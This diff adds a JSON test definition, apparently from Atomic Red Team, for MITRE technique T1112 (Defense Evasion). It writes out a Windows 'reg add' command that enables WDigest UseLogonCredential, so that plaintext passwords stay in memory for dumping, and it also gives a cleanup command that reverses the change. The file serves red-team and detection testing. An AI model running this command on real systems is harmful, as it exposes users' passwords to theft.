@@ -1,0 +1,25 @@
+{
+    "name": "Modify registry to store logon credentials",
+    "description": "Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping). Upon execution, the message The operation completed successfully. will be displayed. Additionally, open Registry Editor to view the modified entry in HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n",
+        "cleanup_command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f >nul 2>&1\n",
+        "name": "command_prompt",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1112",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Modify Registry",
+    "source": "ART",
+    "uuid": "c0413fb5-33e2-40b7-9b6f-60b29f4a7a18",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
